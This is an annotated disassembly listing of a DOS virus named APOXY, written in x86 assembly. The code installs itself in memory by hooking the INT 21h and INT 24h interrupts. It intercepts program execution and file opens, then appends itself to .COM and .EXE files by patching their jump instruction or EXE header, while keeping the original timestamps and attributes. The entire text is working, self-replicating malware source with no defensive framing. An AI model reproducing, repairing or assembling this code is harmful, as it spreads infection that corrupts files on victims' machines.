  
PAGE  59,132
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        APOXY				         €€
;€€								         €€
;€€      Created:   5-Jan-80					         €€
;€€      Version:						         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
data_1e		equ	0F6h			; (042A:00F6=0)
data_2e		equ	3D5h			; (042A:03D5=6Ch)
data_3e		equ	3DDh			; (042A:03DD=61h)
data_4e		equ	42Ah			; (042A:042A=2065h)
data_5e		equ	448h			; (042A:0448=6575h)
data_6e		equ	44Ah			; (042A:044A=2E20h)
data_7e		equ	3			; (80C6:0003=0FFFFh)
data_8e		equ	41Bh			; (80C6:041B=33h)
data_9e		equ	2			; (80C7:0002=0)
data_10e	equ	0B6h			; (80C7:00B6=80h)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
apoxy		proc	far
  
start:
		jmp	loc_5			; (0110)
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		int	20h			; Program Terminate
		db	 77h, 6Fh, 72h, 6Bh, 65h, 64h
		db	 24h
loc_5:
		call	sub_4			; (0410)
		mov	ax,4288h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		cmp	ax,4288h
		je	loc_6			; Jump if equal
		call	sub_1			; (037A)
loc_6:
		call	sub_2			; (03C3)
		cmp	word ptr cs:[427h][bp],5A4Dh	; (80C7:0427=7400h)
		je	loc_7			; Jump if equal
		push	cs
		push	cs
		pop	ds
		pop	es
		mov	ds:[bp+34h],cs
		lea	si,[bp+427h]		; Load effective addr
		mov	di,offset ds:[100h]	; (80C7:0100=0E9h)
		mov	cx,3
		cld				; Clear direction
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		call	sub_3			; (0403)
;*		jmp	far ptr loc_2		;*(0000:0100)
		db	0EAh, 00h, 01h, 00h, 00h
loc_7:
		push	ds
		push	cs
		pop	ds
		mov	ax,es
		add	ax,10h
		add	[bp+41Eh],ax
		add	[bp+420h],ax
		mov	ax,[bp+41Eh]
		mov	cx,[bp+41Ch]
		mov	[bp+67h],ax
		mov	[bp+65h],cx
		pop	ds
		cli				; Disable interrupts
		mov	ss,word ptr cs:[420h][bp]	; (80C7:0420=5056h)
		mov	sp,word ptr cs:[422h][bp]	; (80C7:0422=0F28Bh)
		sti				; Enable interrupts
		call	sub_3			; (0403)
;*		jmp	far ptr loc_1		;*(0000:0000)
		db	0EAh, 00h, 00h, 00h, 00h
		pushf				; Push flags
		cmp	ax,4288h
		jne	loc_8			; Jump if not equal
		mov	ax,4288h
		popf				; Pop flags
		iret				; Interrupt return
loc_8:
		cmp	ax,4299h
		jne	loc_11			; Jump if not equal
		mov	byte ptr cs:[41Ah],0Bh	; (80C7:041A=0B6h)
		jmp	short loc_15		; (01D3)
loc_9:
		mov	byte ptr cs:[41Bh],0	; (80C7:041B=0)
		popf				; Pop flags
		stc				; Set carry flag
		retf	2			; Return far
loc_10:
		mov	byte ptr cs:[41Bh],0	; (80C7:041B=0)
		popf				; Pop flags
		clc				; Clear carry flag
		iret				; Interrupt return
loc_11:
		cmp	ax,4B00h
		je	loc_12			; Jump if equal
		cmp	ah,3Dh			; '='
		je	loc_12			; Jump if equal
		cmp	ah,56h			; 'V'
		je	loc_12			; Jump if equal
		cmp	ah,43h			; 'C'
		jne	loc_13			; Jump if not equal
loc_12:
		mov	byte ptr cs:[41Ah],0	; (80C7:041A=0B6h)
		jmp	short loc_15		; (01D3)
loc_13:
		popf				; Pop flags
;*		jmp	far ptr loc_3		;*(0019:40EB)
		db	0EAh,0EBh, 40h, 19h, 00h
loc_14:
		mov	byte ptr cs:[41Bh],0	; (80C7:041B=0)
		jmp	loc_27			; (0356)
loc_15:
		call	sub_6			; (0420)
		jc	loc_13			; Jump if carry Set
		push	ax
		push	bx
		push	cx
		push	dx
		push	ds
		push	es
		push	di
		push	si
		call	sub_13			; (04BD)
		mov	word ptr cs:[448h],ds	; (80C7:0448=7C80h)
		mov	word ptr cs:[44Ah],dx	; (80C7:044A=4D02h)
		mov	ax,3D00h
		call	sub_5			; (0416)
		jc	loc_14			; Jump if carry Set
		xchg	ax,bx
		push	cs
		pop	ds
		mov	ah,3Fh			; '?'
		mov	dx,offset ds:[42Ah]	; (80C7:042A=3Ch)
		mov	cx,18h
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		call	sub_10			; (0493)
		push	ax
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		pop	ax
		cmp	word ptr ds:[42Ah],5A4Dh	; (80C7:042A=613Ch)
		je	loc_17			; Jump if equal
		cmp	dx,0
		ja	loc_16			; Jump if above
		cmp	ax,0D6D8h
		ja	loc_16			; Jump if above
		push	ax
		add	ax,0FBCFh
		cmp	word ptr ds:[42Bh],ax	; (80C7:042B=7261h)
		pop	ax
		jz	loc_16			; Jump if zero
		add	ax,0FFFDh
		mov	word ptr ds:[428h],ax	; (80C7:0428=0F74h)
		jmp	short loc_20		; (02A2)
loc_16:
		mov	byte ptr cs:[41Bh],0	; (80C7:041B=0)
		jmp	loc_27			; (0356)
loc_17:
		cmp	word ptr ds:[43Eh],0	; (80C7:043E=5845h)
		je	loc_16			; Jump if equal
		push	ax
		mov	ax,word ptr ds:[43Eh]	; (80C7:043E=5845h)
		mov	word ptr ds:[41Fh],ax	; (80C7:041F=56C3h)
		mov	ax,word ptr ds:[440h]	; (80C7:0440=0F74h)
		mov	word ptr ds:[421h],ax	; (80C7:0421=8B50h)
		mov	ax,word ptr ds:[438h]	; (80C7:0438=83EBh)
		mov	word ptr ds:[423h],ax	; (80C7:0423=8AF2h)
		mov	ax,word ptr ds:[43Ah]	; (80C7:043A=3EEh)
		mov	word ptr ds:[425h],ax	; (80C7:0425=3C04h)
		pop	ax
		add	ax,10h
		adc	dx,0
		and	ax,0FFF0h
		push	ax
		push	dx
		push	ax
		push	dx
		add	ax,42Eh
		adc	dx,0
		mov	cx,200h
		div	cx			; ax,dx rem=dx:ax/reg
		or	dx,dx			; Zero ?
		jz	loc_18			; Jump if zero
		inc	ax
loc_18:
		mov	word ptr ds:[42Ch],dx	; (80C7:042C=872h)
		mov	word ptr ds:[42Eh],ax	; (80C7:042E=7A3Ch)
		pop	dx
		pop	ax
		mov	cx,4
  
locloop_19:
		shr	dx,1			; Shift w/zeros fill
		rcr	ax,1			; Rotate thru carry
		loop	locloop_19		; Loop if cx > 0
  
		sub	ax,word ptr ds:[432h]	; (80C7:0432=202Ch)
		sbb	dx,0
		mov	word ptr ds:[438h],ax	; (80C7:0438=83EBh)
		mov	word ptr ds:[440h],ax	; (80C7:0440=0F74h)
		mov	word ptr ds:[43Ah],54Ch	; (80C7:043A=3EEh)
		mov	word ptr ds:[43Eh],0	; (80C7:043E=5845h)
loc_20:
		push	ds
		mov	dx,word ptr ds:[44Ah]	; (80C7:044A=4D02h)
		mov	ds,word ptr ds:[448h]	; (80C7:0448=7C80h)
		call	sub_12			; (04A4)
		jnc	loc_21			; Jump if carry=0
		pop	ds
		jmp	loc_27			; (0356)
loc_21:
		mov	ax,3D02h
		call	sub_5			; (0416)
		xchg	ax,bx
		pop	ds
		cmp	word ptr ds:data_4e,5A4Dh	; (042A:042A=2065h)
		je	loc_22			; Jump if equal
		xor	cx,cx			; Zero register
		mov	dx,6
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		call	sub_9			; (0476)
		jc	loc_24			; Jump if carry Set
		call	sub_8			; (0460)
		jmp	short loc_24		; (02FB)
loc_22:
		mov	ax,4200h
		mov	dx,26h
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		call	sub_9			; (0476)
		jnc	loc_23			; Jump if carry=0
		mov	ax,4200h
		mov	dx,206h
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		call	sub_9			; (0476)
		jnc	loc_23			; Jump if carry=0
		jmp	short loc_24		; (02FB)
loc_23:
		call	sub_7			; (045B)
loc_24:
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	cx,3
		mov	dx,427h
		cmp	word ptr ds:data_4e,5A4Dh	; (042A:042A=2065h)
		jne	loc_25			; Jump if not equal
		mov	dx,data_4e		; (042A:042A=65h)
		mov	cx,18h
loc_25:
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		call	sub_10			; (0493)
		cmp	word ptr ds:data_4e,5A4Dh	; (042A:042A=2065h)
		jne	loc_26			; Jump if not equal
		pop	cx
		pop	dx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_26:
		xor	dx,dx			; Zero register
		mov	cx,42Eh
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	dx,ds:data_6e		; (042A:044A=2E20h)
		mov	ds,ds:data_5e		; (042A:0448=6575h)
		call	sub_11			; (049D)
		mov	byte ptr cs:[41Bh],1	; (80C7:041B=0)
loc_27:
		call	sub_14			; (04D9)
		pop	si
		pop	di
		pop	es
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		cmp	byte ptr cs:[41Ah],0Bh	; (80C7:041A=0B6h)
		jne	loc_29			; Jump if not equal
		cmp	byte ptr cs:[41Bh],1	; (80C7:041B=0)
		jne	loc_28			; Jump if not equal
		jmp	loc_10			; (019F)
loc_28:
		jmp	loc_9			; (0194)
loc_29:
		jmp	loc_13			; (01C4)
  
apoxy		endp
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_1		proc	near
		push	ds
		push	es
		mov	ax,es
		dec	ax
		mov	es,ax
		sub	word ptr es:data_7e,55h	; (80C6:0003=0FFFFh)
		inc	ax
		add	ax,es:data_7e		; (80C6:0003=0FFFFh)
		mov	ds:data_9e,ax		; (80C7:0002=0)
		mov	es,ax
		push	es
		push	cs
		pop	ds
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	[bp+0B3h],bx
		mov	[bp+0B5h],es
		pop	es
		lea	si,[bp-3]		; Load effective addr
		xor	di,di			; Zero register
		mov	cx,54Dh
		cld				; Clear direction
		cli				; Disable interrupts
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		sti				; Enable interrupts
		push	es
		pop	ds
;*		mov	dx,offset loc_4		;*
		db	0BAh, 6Ch, 00h
		mov	ax,2521h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	byte ptr es:data_8e,0	; (80C6:041B=33h)
		pop	es
		pop	ds
		retn
sub_1		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_2		proc	near
		push	cs
		pop	ds
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	word ptr ds:[3E4h][bp],es	; (80C7:03E4=21CDh)
		mov	word ptr ds:[3E2h][bp],bx	; (80C7:03E2=27h)
		lea	dx,[bp+3ECh]		; Load effective addr
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		lea	dx,[bp+3E6h]		; Load effective addr
		mov	ah,4Eh			; 'N'
		mov	cx,27h
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jnc	loc_30			; Jump if carry=0
loc_30:
		mov	ax,4299h
		lea	dx,[bp+40Ah]		; Load effective addr
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jnc	loc_31			; Jump if carry=0
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_30			; Jump if carry=0
loc_31:
		lds	dx,dword ptr ds:[3E2h][bp]	; (80C7:03E2=27h) Load 32 bit ptr
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		retn
sub_2		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_3		proc	near
		xor	di,di			; Zero register
		xor	si,si			; Zero register
		xor	bx,bx			; Zero register
		xor	dx,dx			; Zero register
		xor	bp,bp			; Zero register
		xor	ax,ax			; Zero register
		retn
sub_3		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_4		proc	near
		mov	bp,sp
		mov	bp,[bp]
		retn
sub_4		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_5		proc	near
		pushf				; Push flags
		call	dword ptr cs:data_10e	; (80C7:00B6=80h)
sub_5		endp
  
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;			External Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
int_24h_entry	proc	far
		jnc	loc_ret_32		; Jump if carry=0
		stc				; Set carry flag
  
loc_ret_32:
		retn
int_24h_entry	endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_6		proc	near
		push	si
		push	ax
		mov	si,dx
loc_33:
		mov	al,[si]
		cmp	al,0
		je	loc_35			; Jump if equal
		cmp	al,61h			; 'a'
		jb	loc_34			; Jump if below
		cmp	al,7Ah			; 'z'
		ja	loc_34			; Jump if above
		sub	al,20h			; ' '
		mov	[si],al
loc_34:
		inc	si
		jmp	short loc_33		; (0424)
loc_35:
		sub	si,3
		cmp	word ptr [si],5845h
		je	loc_36			; Jump if equal
		cmp	word ptr [si],4F43h
		jne	loc_37			; Jump if not equal
		cmp	byte ptr [si+2],4Dh	; 'M'
		jne	loc_37			; Jump if not equal
		pop	ax
		pop	si
		retn
loc_36:
		cmp	byte ptr [si+2],45h	; 'E'
		je	loc_38			; Jump if equal
loc_37:
		stc				; Set carry flag
loc_38:
		pop	ax
		pop	si
		retn
sub_6		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_7		proc	near
		mov	dx,0FCD3h
		jmp	short loc_39		; (0463)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_8:
		mov	dx,0FD2Fh
loc_39:
		xor	cx,cx			; Zero register
		dec	cx
		mov	ax,4202h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	dx,data_1e		; (042A:00F6=0)
		mov	cx,2
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		retn
sub_7		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_9		proc	near
		mov	dx,data_2e		; (042A:03D5=6Ch)
		mov	cx,8
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		push	ds
		pop	es
		mov	di,data_2e		; (042A:03D5=6Ch)
		mov	si,data_3e		; (042A:03DD=61h)
		mov	cx,8
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_40			; Jump if not zero
		clc				; Clear carry flag
		retn
loc_40:
		stc				; Set carry flag
		retn
sub_9		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_10		proc	near
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		mov	ax,4202h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		retn
sub_10		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_11		proc	near
		mov	cx,word ptr cs:[446h]	; (80C7:0446=0F75h)
		jmp	short loc_41		; (04B2)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_12:
		mov	ax,4300h
		call	sub_5			; (0416)
		mov	word ptr cs:[446h],cx	; (80C7:0446=0F75h)
		and	cl,0FEh
loc_41:
		mov	ax,4301h
		call	sub_5			; (0416)
		jc	loc_42			; Jump if carry Set
		retn
loc_42:
		stc				; Set carry flag
		retn
sub_11		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_13		proc	near
		push	dx
		push	ds
		push	cs
		pop	ds
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	word ptr ds:[442h],bx	; (80C7:0442=3C81h)
		mov	word ptr ds:[444h],es	; (80C7:0444=4F43h)
		mov	ax,2524h
		mov	dx,offset int_24h_entry
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		pop	ds
		pop	dx
		retn
sub_13		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_14		proc	near
		push	cs
		pop	ds
		mov	ax,2524h
		lds	dx,dword ptr ds:[442h]	; (80C7:0442=3C81h) Load 32 bit ptr
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		retn
sub_14		endp
  
		and	bp,cx
		and	[bx+6Fh],dh
		jc	$+6Dh			; Jump if carry Set
		db	 65h, 22h, 19h, 35h, 93h, 59h
		db	 57h, 54h, 80h, 00h, 00h, 00h
		db	 00h
		db	 2Ah, 2Eh, 45h, 58h, 45h
		db	46 dup (0)
		db	0B0h, 00h,0CFh, 00h, 33h, 00h
		db	 00h,0E4h, 0Fh, 80h, 06h,0E9h
		db	 0Dh, 00h,0BAh, 09h, 01h,0B4h
  
seg_a		ends
  
  
  
		end	start
